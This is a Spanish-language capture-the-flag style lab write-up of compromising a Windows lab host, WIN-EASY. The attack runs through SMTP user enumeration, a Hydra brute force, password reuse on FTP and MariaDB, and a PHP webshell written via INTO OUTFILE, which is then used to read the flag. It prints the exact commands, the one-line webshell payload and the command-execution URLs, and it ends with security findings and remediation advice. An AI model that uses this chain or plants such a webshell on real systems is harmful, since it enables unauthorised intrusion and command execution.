# Write-up — WIN-EASY (Attacking Common Services)

## Resumen ejecutivo

Máquina Windows (`WIN-EASY`, Server 2019) con un stack apilado: Core FTP, hMailServer (correo), XAMPP (Apache + PHP + MariaDB) y RDP. El compromiso se logró por **reutilización de credenciales**: una sola contraseña obtenida por fuerza bruta de SMTP sirvió en FTP y en MariaDB, donde el usuario resultó ser administrador de la base de datos con privilegio `FILE`. Eso permitió escribir un webshell PHP en el webroot de XAMPP vía `INTO OUTFILE` y obtener ejecución de comandos para leer la flag.

**Cadena de ataque:**
SMTP user enum (`fiona` válida) → Hydra sobre SMTP (`fiona:987654321`) → reuse en FTP → saqueo de `WebServersInfo.txt` (reveló el webroot) → reuse en MariaDB (fiona = DBA con FILE) → webshell vía `INTO OUTFILE` en `C:\xampp\htdocs\` → RCE → flag.

---

## 1. Enumeración

### Escaneo de puertos

```
sudo nmap -Pn -sV -sC 10.129.203.7
```

Servicios relevantes identificados:

| Puerto | Servicio | Versión | Nota |
|--------|----------|---------|------|
| 21 | FTP | Core FTP 2.0 build 725 | Con TLS |
| 25 / 587 | SMTP | hMailServer | `VRFY` y `AUTH LOGIN PLAIN` anunciados |
| 80 / 443 | HTTP/S | Apache 2.4.53 + PHP 7.4.29 | XAMPP (dashboard) |
| 3306 | MySQL | MariaDB 10.4.24 | Parte de XAMPP |
| 3389 | RDP | Windows Server 2019 (10.0.17763) | Host: WIN-EASY |

Hallazgos clave de la enumeración:
- **XAMPP** confirmado por el dashboard en el puerto 80 → webroot esperado en `C:\xampp\htdocs\`.
- **hMailServer** con `VRFY` habilitado → enumeración de usuarios posible.
- Puertos de correo de lectura (POP3 110 / IMAP 143 / 993 / 995) **cerrados** → el buzón no es accesible, solo SMTP para autenticar.

---

## 2. Enumeración de usuarios SMTP

Con `VRFY`/`RCPT` disponible en hMailServer, se enumeran usuarios contra el dominio `inlanefreight.htb`:

```
smtp-user-enum -t 10.129.203.7 -U users.list -M RCPT -D inlanefreight.htb
```

Resultado:
```
10.129.203.7: fiona@inlanefreight.htb exists
```

Usuario válido confirmado: **`fiona@inlanefreight.htb`**.

---

## 3. Fuerza bruta de credenciales (SMTP)

Como los puertos POP3/IMAP están cerrados, la fuerza bruta se dirige al **SMTP (25)**, que sí está abierto y acepta `AUTH LOGIN PLAIN`:

```
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.203.7
```

Resultado:
```
[25][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321
```

Credencial obtenida: **`fiona:987654321`**.

> Nota: SMTP solo permite *enviar* correo y confirmar que la credencial es válida; no da acceso al buzón (eso requeriría POP3/IMAP, cerrados aquí). El valor de la credencial está en reutilizarla en otros servicios.

---

## 4. Reutilización de credenciales — FTP

La credencial de fiona se prueba en el FTP (Core FTP):

```
ftp 10.129.203.7
# Name: fiona
# Password: 987654321
230 Logged on
```

Acceso concedido. El cliente `ftp` básico se colgó en modo pasivo extendido al listar; se resolvió alternando el modo con el comando `passive` dentro de la sesión FTP.

Contenido del directorio de fiona (jaula FTP — chroot a su carpeta, no al filesystem completo). Entre los archivos, uno clave:

### `WebServersInfo.txt`

```
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

Este archivo **confirma el webroot de Apache**: `C:\xampp\htdocs\`. Dato decisivo para la explotación.

> La sesión FTP está enjaulada (`550 CWD failed` al intentar `cd C:/xampp/htdocs`), así que el webshell no puede subirse directamente por FTP. Se pivota a MySQL, que no está enjaulado.

---

## 5. Reutilización de credenciales — MariaDB (el vector de RCE)

MySQL root sin contraseña no funcionó. Se prueba fiona (reuse de credencial). El cliente moderno exige TLS y el servidor no lo soporta, así que se desactiva:

```
mysql -h 10.129.203.7 -u fiona -p --skip-ssl
```

Dentro, se verifican privilegios:

```sql
SHOW GRANTS;
```
```
GRANT ALL PRIVILEGES ON *.* TO `fiona`@`%` IDENTIFIED BY PASSWORD '*DABCF719388B72AD432DE5E88423B56D652DD8B0' ...
```

**fiona es administradora de la base de datos** (`ALL PRIVILEGES ON *.*`), lo que incluye el privilegio `FILE` necesario para escribir archivos en disco.

---

## 6. Explotación — webshell vía INTO OUTFILE

Con privilegio `FILE` y el webroot conocido, se escribe un webshell PHP directamente en `C:\xampp\htdocs\`:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

> Se usan barras normales (`/`) en la ruta porque MySQL interpreta `\` como escape.

---

## 7. Ejecución de comandos (RCE) y flag

El webshell se ejecuta vía HTTP, pasando comandos por el parámetro `cmd`:

```
http://10.129.203.7/shell.php?cmd=whoami
```

Con RCE confirmado, se lee la flag directamente (sin necesidad de reverse shell interactiva), usando `type` (el `cat` de Windows):

```
http://10.129.203.7/shell.php?cmd=type%20C:\Users\Administrator\Desktop\flag.txt
```

Flag obtenida desde el escritorio del Administrator. El webshell corre con privilegios suficientes para leer ese directorio (Apache de XAMPP corre con cuenta privilegiada).

---

## Hallazgos de seguridad

- **Reutilización de credenciales entre servicios** — una sola contraseña (`987654321`) daba acceso a correo, FTP y base de datos. Vector principal del compromiso.
- **Contraseña débil** — `987654321` cayó en segundos con rockyou.
- **SMTP con `VRFY` habilitado** — permite enumeración de usuarios sin autenticación.
- **Usuario de base de datos sobreprivilegiado** — fiona con `ALL PRIVILEGES` + `FILE`, innecesario para una cuenta de aplicación, habilitó la escritura del webshell.
- **`secure_file_priv` permisivo** (default de XAMPP) — permitió `INTO OUTFILE` hacia el webroot.
- **Apache corriendo con privilegios elevados** — el webshell pudo leer el directorio del Administrator sin escalada.

## Recomendaciones de remediación

- Contraseñas robustas y únicas por servicio; prohibir reutilización.
- Deshabilitar `VRFY`/`EXPN` en hMailServer.
- Principio de mínimo privilegio en la base de datos: la cuenta de aplicación no debe tener `ALL PRIVILEGES` ni `FILE`.
- Configurar `secure_file_priv` a un directorio restringido (o `NULL` para deshabilitar escritura de archivos).
- Ejecutar Apache/PHP con una cuenta de servicio de bajos privilegios.
- Segmentar: el FTP enjaulado fue una buena práctica; aplicar el mismo criterio al resto de servicios.